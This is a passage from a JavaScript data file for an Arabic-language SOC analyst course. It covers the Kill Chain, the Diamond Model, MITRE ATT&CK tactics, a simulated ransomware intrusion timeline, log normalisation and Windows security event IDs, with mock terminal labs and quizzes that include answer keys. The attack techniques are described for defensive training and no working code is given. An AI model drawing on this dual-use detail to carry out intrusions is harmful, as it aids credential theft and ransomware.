</ol>
<p><strong>القاعدة الذهبية للـ SOC:</strong> إذا نجح المحلل في قطع أي حلقة واحدة من السلسلة، يفشل الهجوم بالكامل!</p>

<h4>2. نموذج الألماسة لتحليل التسلل (The Diamond Model of Intrusion Analysis)</h4>
<p>يربط أي حادثة أمنية بأربعة أركان أساسية مترابطة:</p>
<ul>
  <li><strong>المهاجم (Adversary):</strong> الجهة المهاجمة أو جماعة الـ APT المسؤولة.</li>
  <li><strong>القدرات (Capabilities):</strong> الأدوات والبرمجيات الخبيثة والتقنيات التي يمتلكها المهاجم.</li>
  <li><strong>البنية التحتية (Infrastructure):</strong> خوادم الـ C2 وعناوين الـ IP والنطاقات المستخدمة للهجوم.</li>
  <li><strong>الضحية (Victim):</strong> المؤسسة المستهدفة أو النظام والأصول المتضررة.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي خريطة الألماسة (Diamond Model Mapping)</span>
    <h4>إسقاط بيانات حادثة أمنية على أركان نموذج الألماسة الأربعة</h4>
  </div>
  <p>شاهد تصنيف مؤشرات الحادثة وفق النموذج:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> diamond-model-correlator</div>
    <pre class="terminal-code">=== INCIDENT DIAMOND MODEL MAPPING ===
[ADVERSARY]:      APT29 (Cozy Bear - Russian State-Sponsored Group)
[CAPABILITY]:     Cobalt Strike Beacon + Mimikatz + PowerShell Injection
[INFRASTRUCTURE]: Fast-Flux C2 IPs (194.135.211.9, 185.220.101.5) on Port 443
[VICTIM]:         Corporate Finance Active Directory Domain Controller</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في إطار Cyber Kill Chain، ما هي المرحلة التي يقوم فيها المهاجم بدمج البرمجية الخبيثة مع وسيلة استغلال (مثل مستند وورد يحتوي على ماكرو خبيث) قبل إرسالها؟",
          questionEn: "Which Kill Chain phase pairs malware with an exploit before delivery?",
          optionsAr: [
            "مرحلة التسلح (Weaponization)",
            "مرحلة الاستطلاع (Reconnaissance)",
            "مرحلة الإجراءات على الأهداف (Actions on Objectives)",
            "مرحلة الاسترجاع (Recovery)"
          ],
          optionsEn: [
            "Weaponization",
            "Reconnaissance",
            "Actions on Objectives",
            "Recovery"
          ],
          correctIndex: 0,
          explanationAr: "مرحلة التسلح (Weaponization) هي المرحلة الثانية التي يقوم فيها المهاجم بتجهيز وتغليف حمولته الخبيثة داخل ملف ناقل قابل للتنفيذ تمهيداً لإرساله للضحية في مرحلة الإيصال (Delivery)."
        }
      },
      {
        id: "lesson-5-7",
        courseId: "course-5",
        number: "5.7",
        titleAr: "الإتقان الكامل لإطار MITRE ATT&CK Framework: شرح التكتيكات الـ 14 (Tactics)، التقنيات (Techniques & Sub-techniques)، وكيف نستخدم أداة MITRE ATT&CK Navigator",
        titleEn: "MITRE ATT&CK Mastery: 14 Enterprise Tactics, Techniques, Sub-techniques & ATT&CK Navigator",
        duration: "55 min",
        theoryAr: `
<h3>المعجم العالمي الموحد للأمن السيبراني: كيف يتحدث المدافعون والمهاجمون نفس اللغة؟</h3>
<p class="lead">يعد إطار عمل MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) الموسوعة الأكثر أهمية واكتمالاً في العالم لتوثيق السلوكيات الواقعية للمهاجمين؛ فهو لا يركز على مجرد عناوين IP أو هاشات سريعة التغير، بل يوثق التكتيكات والتقنيات الفعلية (TTPs).</p>

<h4>الهرمية الثلاثية لإطار MITRE ATT&CK:</h4>
<ul>
  <li><strong>التكتيك (Tactic):</strong> الهدف النهائي للمهاجم في هذه الخطوة (السؤال: <em>"لماذا يفعل المهاجم هذا؟"</em> - مثل: سرقة بيانات الاعتماد).</li>
  <li><strong>التقنية (Technique):</strong> الطريقة المحددة لتحقيق الهدف (السؤال: <em>"كيف ينفذ المهاجم هدفه؟"</em> - مثل: تفريغ ذاكرة LSASS). تُرقم برمز حرف T متبوعاً بأربعة أرقام (مثل <code>T1003</code>).</li>
  <li><strong>التقنية الفرعية (Sub-technique):</strong> التفصيل الدقيق لطريقة التنفيذ (مثل <code>T1003.001: LSASS Memory Dumping</code>).</li>
</ul>

<h4>التكتيكات الـ 14 لبيئة المؤسسات (The 14 Enterprise Tactics):</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>رقم التكتيك والاسم</th>
        <th>الهدف الاستراتيجي للمهاجم</th>
        <th>أشهر التقنيات التابعة له</th>
      </tr>
    </thead>
    <tbody>
      <tr><td><strong>1. Reconnaissance (TA0043)</strong></td><td>جمع المعلومات لاختيار الهدف المناسب.</td><td>Active Scanning (T1595), Search Victim-Owned Websites</td></tr>
      <tr><td><strong>2. Resource Development (TA0042)</strong></td><td>شراء سيرفرات، نطاقات، وشهادات لتجهيز الهجوم.</td><td>Acquire Infrastructure (T1583), Compromise Accounts</td></tr>
      <tr><td><strong>3. Initial Access (TA0001)</strong></td><td>الحصول على موطئ قدم أولي داخل شبكة المؤسسة.</td><td>Phishing (T1566), Exploit Public-Facing App (T1190)</td></tr>
      <tr><td><strong>4. Execution (TA0002)</strong></td><td>تشغيل الكود الخبيث على النظام المخترق.</td><td>Command & Scripting Interpreter: PowerShell (T1059.001)</td></tr>
      <tr><td><strong>5. Persistence (TA0003)</strong></td><td>البقاء في النظام حتى بعد إعادة تشغيل الجهاز.</td><td>Registry Run Keys (T1547.001), Scheduled Task (T1053)</td></tr>
      <tr><td><strong>6. Privilege Escalation (TA0004)</strong></td><td>رفع الصلاحيات من مستخدم عادي إلى Admin أو SYSTEM.</td><td>Process Injection (T1055), SUID Abuse (T1548.001)</td></tr>
      <tr><td><strong>7. Defense Evasion (TA0005)</strong></td><td>تضليل برامج الحماية وإخفاء الآثار ومسح السجلات.</td><td>Masquerading (T1036), Indicator Removal: Clear Logs (T1070)</td></tr>
      <tr><td><strong>8. Credential Access (TA0006)</strong></td><td>سرقة كلمات المرور والهاشات وتذاكر الدخول.</td><td>OS Credential Dumping: LSASS Memory (T1003.001), Kerberoasting (T1558.003)</td></tr>
      <tr><td><strong>9. Discovery (TA0007)</strong></td><td>استكشاف بيئة النظام والشبكة والملفات الداخلية.</td><td>Account Discovery (T1087), Network Service Discovery (T1046)</td></tr>
      <tr><td><strong>10. Lateral Movement (TA0008)</strong></td><td>التمدد والتنقل بين أجهزة وسيرفرات الشبكة الداخلية.</td><td>SMB/Windows Admin Shares (T1021.002), RDP (T1021.001)</td></tr>
      <tr><td><strong>11. Collection (TA0009)</strong></td><td>تجميع الملفات الحساسة ورسائل البريد لسرقتها.</td><td>Archive Collected Data: Zip (T1560), Screen Capture (T1113)</td></tr>
      <tr><td><strong>12. Command & Control (TA0011)</strong></td><td>التواصل مع خادم الهكر الخارجي للتحكم بالجهاز.</td><td>Application Layer Protocol: Web (T1071.001), DNS (T1071.004)</td></tr>
      <tr><td><strong>13. Exfiltration (TA0010)</strong></td><td>تهريب ونقل البيانات المسروقة خارج الشركة.</td><td>Exfiltration Over C2 Channel (T1041), Exfiltration to Cloud</td></tr>
      <tr><td><strong>14. Impact (TA0040)</strong></td><td>تدمير أو تشفير الأنظمة لتعطيل أعمال المؤسسة.</td><td>Data Encrypted for Impact: Ransomware (T1486), Service Stop</td></tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي مصفوفة MITRE ATT&CK Navigator</span>
    <h4>ربط تنبيهات הـ SIEM بتقنيات المصفوفة بالرموز العالمية</h4>
  </div>
  <p>شاهد تصنيف الحادثة وفق معايير MITRE ATT&CK:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> mitre-navigator-view</div>
    <pre class="terminal-code">ALERT MAPPING TO MITRE ATT&CK:
1. Spearphishing Attachment           -> [Tactic: Initial Access | ID: T1566.001]
2. PowerShell Encoded Execution       -> [Tactic: Execution      | ID: T1059.001]
3. LSASS Process Memory Dumping       -> [Tactic: Credential Access | ID: T1003.001]
4. Remote Desktop Lateral Movement    -> [Tactic: Lateral Movement  | ID: T1021.001]
5. Data Encrypted with AES Ransomware -> [Tactic: Impact         | ID: T1486]</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "تحت أي تكتيك (Tactic) من تكتيكات MITRE ATT&CK الـ 14 تندرج تقنية تفريغ ذاكرة عملية `lsass.exe` لاستخراج كلمات المرور (T1003.001)؟",
          questionEn: "Under which MITRE ATT&CK tactic does LSASS memory dumping fall?",
          optionsAr: [
            "تكتيك الوصول لبيانات الاعتماد (Credential Access - TA0006)",
            "تكتيك الاستطلاع (Reconnaissance)",
            "تكتيك جمع البيانات (Collection)",
            "تكتيك التأثير والتدمير (Impact)"
          ],
          optionsEn: [
            "Credential Access (TA0006)",
            "Reconnaissance",
            "Collection",
            "Impact"
          ],
          correctIndex: 0,
          explanationAr: "تفريغ ذاكرة عملية LSASS يهدف للحصول على كلمات المرور والهاشات وتذاكر الدخول، ولذلك تصنفه MITRE ATT&CK تحت تكتيك Credential Access (TA0006) بالرمز التقني T1003.001."
        }
      },
      {
        id: "lesson-5-8",
        courseId: "course-5",
        number: "5.8",
        titleAr: "تطبيق عملي شامل: تتبع هجوم سيبراني معقد خطوة بخطوة وإسقاطه بالكامل على مصفوفة MITRE ATT&CK",
        titleEn: "Capstone Simulation: Reconstructing a Multi-Stage Cyber Attack onto MITRE ATT&CK",
        duration: "55 min",
        theoryAr: `
<h3>المحاكاة الشاملة لغرفة العمليات: قصة اختراق حقيقي من الصفر حتى التشفير</h3>
<p class="lead">في هذا الدرس التطبيقي الأكبر، نجمع كل المفاهيم السابقة في قصة هجوم واقعية متعددة المراحل تعرضت لها شركة مالية، ونقوم كفريق SOC بتتبع كل خطوة وإسقاطها بالكامل على مصفوفة MITRE ATT&CK.</p>

<h4>سيناريو الحادثة خطوة بخطوة (The Attack Timeline):</h4>
<ul>
  <li><strong>المرحلة 1:</strong> استلم موظف الموارد البشرية بريداً إلكترونياً يدعي أنه سيرة ذاتية لمتقدم وظيفة يحمل ملفاً باسم <code>CV_Ahmed.docm</code> يحتوي على ماكرو خبيث <code>[T1566.001 Spearphishing Attachment]</code>.</li>
  <li><strong>المرحلة 2:</strong> قام الموظف بتفعيل الماكرو، فقام بتشغيل سطر أوامر PowerShell مشفر بـ Base64 يعمل في الخلفية <code>[T1059.001 Command and Scripting: PowerShell]</code>.</li>
  <li><strong>المرحلة 3:</strong> قام السكريبت بتنزيل قذيفة Cobalt Strike وحفظ مفتاح تشغيل تلقائي في الريجستري بالفرع <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> لضمان البقاء <code>[T1547.001 Registry Run Keys]</code>.</li>
  <li><strong>المرحلة 4:</strong> اتصلت القذيفة بسيرفر خارجي (194.87.12.9) عبر منفذ HTTPS بنبضات متكررة كل 60 ثانية <code>[T1071.001 Web Protocols C2]</code>.</li>
  <li><strong>المرحلة 5:</strong> قام المهاجم بحقن كود Mimikatz في الذاكرة وتفريغ ذاكرة عملية <code>lsass.exe</code> وسرقة هاش كلمة سر مدير الدومين <code>[T1003.001 LSASS Memory Dumping]</code>.</li>
  <li><strong>المرحلة 6:</strong> استخدم المهاجم الهاش المسروق للدخول عبر بروتوكول RDP إلى خادم الـ Domain Controller الرئيسي <code>[T1021.001 Remote Desktop Protocol Lateral Movement]</code>.</li>
  <li><strong>المرحلة 7:</strong> قام المهاجم بإنشاء سياسة GPO خبيثة نشرت برمجية فدية LockBit وشفرت جميع خوادم الشركة وحذفت النسخ الاحتياطية <code>[T1486 Data Encrypted for Impact]</code>!</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 تمرين إعادة بناء الهجوم الجنائي (Attack Reconstruction Lab)</span>
    <h4>مراجعة تقرير التتبع الزمني للحادثة في الـ SIEM</h4>
  </div>
  <p>شاهد التسلسل الزمني الكامل للحادثة في لوحة الـ SOC:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> incident-timeline-reconstructor</div>
    <pre class="terminal-code">08:14:02 - Initial Access   : Outlook saved attachment CV_Ahmed.docm
08:14:15 - Execution        : WINWORD.EXE spawned powershell.exe -enc
08:15:30 - Persistence      : RegSetValue HKCU\...\Run\SystemUpdater
08:16:00 - C2 Established   : Outbound TLS session to 194.87.12.9:443
08:22:10 - Credential Dump  : Sysmon ID 10 LSASS accessed by rundll32.exe
08:35:00 - Lateral Movement : Event 4624 Logon Type 10 (RDP) on DC-01
08:45:00 - Impact Triggered : Mass file rename to .lockbit extension</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('timeline-verify INC-FULL-RECON', 'standalone-term-body'); app.showToast('تم اعتماد تقرير التحقيق الجنائي الكامل', 'success');">اعتماد تقرير الحادثة الجنائية</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "في سيناريو الهجوم السابق، ما هو الإجراء الفوري الحاسم الذي لو اتخذه محلل الـ SOC في المرحلة 4 لكان كفيلاً بمنع حدوث المرحلتين 6 و 7 (سرقة الدومين وتشفير الفدية)؟",
          questionEn: "Which immediate action in Phase 4 would have prevented DC compromise and ransomware?",
          optionsAr: [
            "عزل جهاز الموظف المصاب عن الشبكة فوراً (Host Isolation) وحظر عنوان الـ IP لسيرفر الـ C2 على الجدار الناري",
            "إعادة تشغيل خادم الدومين فوراً",
            "إرسال رسالة توبيخ للموظف عبر تطبيق واتساب",
            "الانتظار حتى انتهاء ساعات الدوام الرسمي"
          ],
          optionsEn: [
            "Immediately isolating the compromised endpoint and blocking the C2 IP on firewalls",
            "Restarting Domain Controller",
            "Sending a WhatsApp message to the employee",
            "Waiting until the shift ends"
          ],
          correctIndex: 0,
          explanationAr: "العزل الشبكي الفوري (Host Isolation) يقطع حبل القيادة والسيطرة (C2) ويمنع المهاجم من التمدد للأجهزة الأخرى (Lateral Movement)، مما يحصر الضرر في جهاز واحد ويحمي باقي المؤسسة والدومين كلياً."
        }
      }
    ]
  },
  {
    id: "course-6",
    courseNumber: 6,
    level: "intermediate",
    levelNameAr: "المستوى الثاني: متوسط",
    levelNameEn: "Level 2: Intermediate",
    levelBadgeColor: "#06B6D4",
    titleAr: "التحليل العميق للسجلات، الشبكات، والنقاط الطرفية",
    titleEn: "Deep Telemetry: Windows Logs, Sysmon, Wireshark, Snort, EDR & OSINT",
    summaryAr: "المختبر المجهري لمحلل الـ SOC: صيغ السجلات ومزامنة توقيت NTP، موسوعة أحداث ويندوز 4624 وأنواع الدخول من 2 إلى 10، أحداث 4688 و 4104، الإتقان الكامل لأداة Sysmon (الأحداث 1، 3، 10، 22)، احتراف Wireshark واستخراج البرمجيات الخبيثة من الـ PCAP، قواعد Snort و Zeek، هندسة الـ EDR، واستخبارات التهديدات وهرم الألم Pyramid of Pain.",
    summaryEn: "Deep telemetry mastery: Windows Event IDs (4624 Logon Types 2-10, 4688, 4104), Sysmon (1, 3, 10, 22), Wireshark PCAP forensics, Snort/Zeek rules, EDR process injection, and OSINT Pyramid of Pain.",
    icon: "🔬",
    duration: "11 ساعة تدريبية",
    lessonsCount: 10,
    badgeAr: "مختص السجلات والتحليل الجنائي الميداني",
    badgeEn: "Telemetry & Network Forensics Specialist",
    lessons: [
      {
        id: "lesson-6-1",
        courseId: "course-6",
        number: "6.1",
        titleAr: "تشريح السجلات (Logs): الصيغ القياسية (Syslog, JSON, XML, CEF) ومشكلة اختلاف التوقيت (NTP & UTC Time Normalization)",
        titleEn: "Log Formats Anatomy (Syslog, JSON, CEF) & Time Synchronization (NTP & UTC Normalization)",
        duration: "50 min",
        theoryAr: `
<h3>أبجدية التحقيق الجنائي: كيف تقرأ الحواسيب وتتوحد السجلات؟</h3>
<p class="lead">السجل (Log) هو الشاهد العيان الذي لا يكذب؛ يسجل كل نقرة، كل تسجيل دخول، وكل اتصال شبكي يمر في المؤسسة. لكي يتمكن الـ SIEM من فهم ملايين السجلات القادمة من أجهزة مختلفة، يجب توحيد صيغها وتوقيتها.</p>

<h4>1. أشهر صيغ السجلات في عالم مراكز العمليات (Log Formats)</h4>
<ul>
  <li><strong>Syslog (RFC 5424):</strong> المعيار الأقدم والأكثر انتشاراً في خوادم لينكس وأجهزة الشبكات (الروترات والسويتشات)؛ يتكون من حقول: الأولوية (Facility/Severity)، الوقت، اسم الجهاز، والرسالة.</li>
  <li><strong>JSON (JavaScript Object Notation):</strong> الصيغة الحديثة الأكثر مرونة؛ تعتمد على الأزواج (Key: Value) مثل <code>{"src_ip": "10.0.0.5", "action": "blocked"}</code>؛ وتعد المعيار الأول لأنظمة Elastic و Wazuh والخدمات السحابية.</li>
  <li><strong>CEF (Common Event Format):</strong> صيغة موحدة طورتها شركة ArcSight وتعتمد عليها كبرى الجدران النارية والـ SIEM لتسهيل قراءة الحقول المشتركة.</li>
  <li><strong>Windows EVTX (XML):</strong> صيغة السجلات الهيكلية لويندوز؛ تخزن البيانات في بنية XML ثنائية تسمح بالاستعلام السريع عبر XPath.</li>
</ul>

<h4>2. الكابوس الجنائي لمحلل الـ SOC: اختلاف التوقيت (Time Skew) وحله</h4>
<p>تخيل أن جدار الحماية في دبي سجل هجوماً في الساعة <code>14:00</code>، بينما سجل سيرفر الضحية في لندن الحدث في الساعة <code>10:00</code> بسبب فارق التوقيت أو عدم دقة ساعة السيرفر! إذا رتب المحلل الأحداث حسب وقتها المحلي، ستظهر النتيجة مشوهة تماماً ويبدو الحدث وكأنه وقع بعد 4 ساعات!</p>
<p><strong>الحل الإلزامي في مراكز الـ SOC:</strong></p>
<ol>
  <li>ربط جميع خوادم وأجهزة المؤسسة بخادم توقيت مركزي معتمد عبر بروتوكول <strong>NTP (Network Time Protocol - UDP 123)</strong>.</li>
  <li>توحيد وتطبيع جميع السجلات في الـ SIEM وفق توقيت غرينتش العالمي <strong>(UTC Normalization)</strong> مهما كان موقع السيرفر الجغرافي.</li>
</ol>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي توحيد التوقيت الجنائي (UTC Time Normalizer)</span>
    <h4>مقارنة السجلات المحلية وتطبيعها لإنشاء تسلسل زمني موحد</h4>
  </div>
  <p>شاهد كيف يوحد الـ SIEM التوقيت العالمي UTC:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> time-normalizer</div>
    <pre class="terminal-code">RAW LOG 1 (Tokyo +9)   : 2026-11-07 13:00:00 JST | FW-Alert: Port 445 scanned from 198.51.100.4
RAW LOG 2 (London +0)  : 2026-11-07 04:00:00 GMT | DC-Alert: Failed Admin Logon
NORMALIZED IN SIEM (UTC):
[04:00:00 UTC] -> [Tokyo FW]: Port 445 scanned
[04:00:00 UTC] -> [London DC]: Failed Admin Logon  <-- SIMULTANEOUS ATTACK IDENTIFIED!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "لماذا تلزم معايير مراكز العمليات الأمنية العالمية (SOC) ضبط وتوحيد توقيت جميع السجلات وفق توقيت UTC الموحد عبر بروتوكول NTP؟",
          questionEn: "Why is UTC time normalization via NTP strictly mandatory in SOCs?",
          optionsAr: [
            "لضمان دقة التسلسل الزمني للحوادث (Incident Timeline) والربط الصحيح بين الأحداث القادمة من أجهزة موزعة في مناطق زمنية مختلفة",
            "لأن توقيت UTC يجعل شاشات العرض تبدو أكثر إشراقاً",
            "لتقليل استهلاك كهرباء أجهزة السيرفرات",
            "لتفادي دفع فواتير اشتراك الإنترنت"
          ],
          optionsEn: [
            "To guarantee precise timeline reconstruction and accurate event correlation across geographically dispersed timezones",
            "Brighter screens",
            "Power saving",
            "Avoid ISP bills"
          ],
          correctIndex: 0,
          explanationAr: "بدون توحيد التوقيت العالمي (UTC Normalization)، يستحيل على محلل الـ SOC أو محرك الارتباط في الـ SIEM ربط الأنشطة المتزامنة التي وقعت في نفس الثانية عبر أجهزة تقع في دول مختلفة."
        }
      },
      {
        id: "lesson-6-2",
        courseId: "course-6",
        number: "6.2",
        titleAr: "موسوعة Windows Security Event Logs: تشريح كامل لأحداث الدخول (4624 بجميع أنواع Logon Types من 2 إلى 10، 4625 بأكواد الخطأ، 4648, 4672)",
        titleEn: "Windows Authentication Event Forensics: Event 4624 (Logon Types 2-10), 4625 Status Codes, 4648 & 4672",
        duration: "55 min",
        theoryAr: `
<h3>المصحف الأمني لمحلل ويندوز: تشريح سجلات المصادقة ونوع تسجيل الدخول</h3>
<p class="lead">الحدث <strong>Event ID 4624 (تسجيل دخول ناجح)</strong> والحدث <strong>Event ID 4625 (تسجيل دخول فاشل)</strong> هما أكثر الأحداث تحليلاً في العالم. السر الذي يميز المحلل المحترف هو قراءة حقل <strong>نوع تسجيل الدخول (Logon Type)</strong> وأكواد الفشل.</p>

<h4>موسوعة أنواع تسجيل الدخول (Logon Types):</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>نوع الدخول</th>
        <th>الاسم الفني</th>
        <th>المعنى الحقيقي وسياق الحدوث</th>
        <th>السياق الأمني في الـ SOC</th>
      </tr>
    </thead>
    <tbody>
      <tr><td><strong>Type 2</strong></td><td>Interactive</td><td>تسجيل دخول فيزيائي مباشر بالجلوس أمام لوحة مفاتيح الحاسوب.</td><td>دخول الموظف الطبيعي، أو وصول فيزيائي مشبوه لخادم مغلق في غرفة السيرفرات!</td></tr>
      <tr><td><strong>Type 3</strong></td><td>Network</td><td>الوصول عبر الشبكة لمجلد مشاركة ملفات (SMB) أو طابعة أو IIS.</td><td>النوع الأكثر شيوعاً؛ يظهر في هجمات <strong>Pass-the-Hash</strong> والحركة الجانبية (Lateral Movement) عبر SMB.</td></tr>
      <tr><td><strong>Type 4</strong></td><td>Batch</td><td>تشغيل مهمة مجدولة (Scheduled Task).</td><td>يظهر عند تفعيل مهام البقاء المجدولة (Persistence).</td></tr>
      <tr><td><strong>Type 5</strong></td><td>Service</td><td>بدء تشغيل خدمة من خدمات ويندوز (Windows Service).</td><td>بدء الخدمات العادية أو استيقاظ خدمات الـ Backdoors الخبيثة.</td></tr>
      <tr><td><strong>Type 7</strong></td><td>Unlock</td><td>إلغاء قفل الشاشة بواسطة المستخدم بعد تركها.</td><td>إثبات عودة الموظف لمكتبه.</td></tr>
      <tr><td><strong>Type 8</strong></td><td>NetworkCleartext</td><td>تسجيل دخول عبر الشبكة مع إرسال كلمة المرور بنص صريح غير مشفر (مثل basic auth في IIS القديم).</td><td>مؤشر خطورة عالي لتسرب كلمات المرور على الشبكة.</td></tr>
      <tr><td><strong>Type 9</strong></td><td>NewCredentials</td><td>استخدام وسيط <code>runas /netonly</code> (أداة تفضيلية للمهاجمين للاتصال بسيرفر خارجي ببيانات اعتماد مختلفة عن الحالية).</td><td>علامة شبه مؤكدة على استخدام أداة <strong>Mimikatz</strong> للتحرك الجانبي!</td></tr>
      <tr><td><strong>Type 10</strong></td><td>RemoteInteractive</td><td>تسجيل دخول عبر سطح المكتب البعيد <strong>RDP (Remote Desktop Protocol)</strong>.</td><td>النوع الأهم لعصابات الفدية للسيطرة على السيرفرات بواجهة رسومية!</td></tr>
    </tbody>
  </table>
</div>

<h4>أهم أكواد الفشل الفرعية في Event ID 4625 (Substatus Codes):</h4>
<ul>
  <li><code>0xC000006A:</code> اسم المستخدم صحيح لكن كلمة المرور خاطئة (Bad Password) - النمط المعتاد للتخمين.</li>
  <li><code>0xC0000064:</code> اسم المستخدم غير موجود أصلاً في النظام (User does not exist) - يدل على فحص واستكشاف عشوائي للأسماء.</li>
  <li><code>0xC0000234:</code> الحساب تم إغلاقه وتجميده بسبب تجاوز عدد المحاولات الفاشلة المسموح بها (Account is locked out).</li>
  <li><code>0xC0000072:</code> الحساب معطل حالياً (Account is disabled).</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي تشريح Event ID 4624 (Logon Type Inspector)</span>
    <h4>تحليل جلسة دخول RDP مشبوهة في غير أوقات الدوام الرسمي</h4>
  </div>
  <p>تفحص حقول السجل الأمني واكتشف نوع الدخول والمصدر:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> event-4624-dissector</div>
    <pre class="terminal-code">Log Name: Security | Event ID: 4624 | Keywords: Audit Success
TimeCreated: 2026-11-07 02:14:05 UTC (Midnight!)
TargetUserName: Administrator
LogonType: 10  <-- RemoteInteractive (RDP Connection!)
IpAddress: 198.51.100.44  <-- External Public IP directly accessing DC via RDP!
ProcessName: C:\Windows\System32\winlogon.exe
[CRITICAL ALERT] External RDP session established with Administrator credentials at 2:00 AM!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في حدث الأمان Event ID 4624، ماذا يعني ظهور القيمة `10` في حقل نوع تسجيل الدخول (Logon Type)؟",
          questionEn: "What does Logon Type 10 mean in Event ID 4624?",
          optionsAr: [
            "تسجيل دخول تفاعلي عن بُعد باستخدام بروتوكول سطح المكتب البعيد (RDP - Remote Desktop Protocol)",
            "تسجيل دخول فيزيائي مباشر بالجلوس أمام الحاسوب",
            "تشغيل مهمة مجدولة تلقائية",
            "انقطاع في كابل الشاشة"
          ],
          optionsEn: [
            "Remote Interactive logon via Remote Desktop Protocol (RDP)",
            "Local physical console logon",
            "Scheduled task execution",
            "Monitor cable unplugged"
          ],
          correctIndex: 0,
          explanationAr: "نوع الدخول 10 (RemoteInteractive) مخصص حصرياً لجلسات الدخول عن بُعد عبر RDP أو Terminal Services، وهو من أهم أنواع السجلات التي يراقبها الـ SOC لكشف الاختراقات الخارجية."
        }
      },
      {
        id: "lesson-6-3",
        courseId: "course-6",
        number: "6.3",
        titleAr: "أحداث إدارة الحسابات، العمليات، والخدمات في ويندوز (4688 مع سطر الأوامر، 4720, 4722, 4728, 4732, 4697, 4698, 7045, 1102, 4104 Script Block Logging)",
        titleEn: "Windows Telemetry Essentials: Process Creation 4688, User Creation 4720, 7045, 1102 & PowerShell 4104",
        duration: "55 min",
        theoryAr: `
<h3>أحجار الذهب في سجلات الأمان: الأحداث الـ 10 الأكثر حساسية في ويندوز</h3>
<p class="lead">لا يمكن لمحلل الـ SOC مراقبة كل شيء في ويندوز؛ بل يركز الـ SIEM على حزمة من أحداث الأمان الذهبية التي تمثل اللحظات الفاصلة في عمر أي هجوم سيبراني.</p>

<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>رقم الحدث (Event ID)</th>
        <th>السجل (Log Name)</th>
        <th>المعنى والحدث المسجل</th>
        <th>الأهمية البالغة لمحلل الـ SOC</th>
      </tr>
    </thead>
    <tbody>
      <tr><td><strong>4688</strong></td><td>Security</td><td>إنشاء عملية جديدة (A new process has been created).</td><td>يتضمن اسم العملية الأب، مسار البرنامج، والأهم: <strong>سطر الأوامر الكامل (Process Command Line)</strong> الذي يكشف الوسائط الخبيثة!</td></tr>
      <tr><td><strong>4720</strong></td><td>Security</td><td>إنشاء حساب مستخدم جديد (A user account was created).</td><td>يظهر عند قيام المهاجم بإنشاء حساب باب خلفي جديد للمحافظة على صلاحياته.</td></tr>
      <tr><td><strong>4722</strong></td><td>Security</td><td>تفعيل حساب مستخدم معطل (A user account was enabled).</td><td>إعادة تنشيط حسابات الموظفين السابقين واستغلالها.</td></tr>
      <tr><td><strong>4728</strong></td><td>Security</td><td>إضافة مستخدم لمجموعة أمان عامة بالدومين (مثل إضافة عضو لـ Domain Admins).</td><td>حالة طوارئ فورية في الـ SOC عند حدوثها دون إذن مسبق.</td></tr>
      <tr><td><strong>4732</strong></td><td>Security</td><td>إضافة مستخدم لمجموعة أمان محلية (مثل Administrators على حاسوب الضحية).</td><td>ترقية الصلاحيات المحلية (Local Privilege Escalation).</td></tr>
      <tr><td><strong>7045</strong></td><td>System</td><td>تثبيت خدمة جديدة في ويندوز (A new service was installed).</td><td>تثبيت أبواب خلفية دائمة تعمل بصلاحيات SYSTEM.</td></tr>
      <tr><td><strong>4698</strong></td><td>Security</td><td>إنشاء مهمة مجدولة جديدة (A scheduled task was created).</td><td>آلية البقاء الدائمة المفضلة للمالوير.</td></tr>
      <tr><td><strong>1102</strong></td><td>Security</td><td>مسح سجل تدقيق الأمان (The audit log was cleared).</td><td>محاولة صريحة من المهاجم لإخفاء آثاره الجنائية (Anti-Forensics / Defense Evasion T1070).</td></tr>
      <tr><td><strong>4104</strong></td><td>PowerShell Ops</td><td>تسجيل كتلة سكريبت كاملة (Script Block Logging).</td><td>أقوى سجل جنائي لباورشيل؛ يسجل الكود البرمجي الكامل المنفذ في الذاكرة حتى لو كان مشفراً أو محقوناً بـ IEX!</td></tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف مسح السجلات الجنائية (Anti-Forensics Alert)</span>
    <h4>رصد إطلاق الحدث الحرج Event ID 1102</h4>
  </div>
  <p>شاهد التنبيه الفوري الصادر عند محاولة المهاجم مسح السجلات:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> security-event-1102</div>
    <pre class="terminal-code">Log Name: Security | Event ID: 1102 | Source: Microsoft-Windows-Eventlog
Subject:
  Security ID: DOMAIN\Administrator
  Account Name: Administrator
  Logon ID: 0x1A42F
Description: The audit log was cleared.
[CRITICAL SEV-1 ALERT] Active Tampering: Security Event Log deliberately wiped by Administrator account!</pre>
  </div>
</div>
`,
        quiz: {
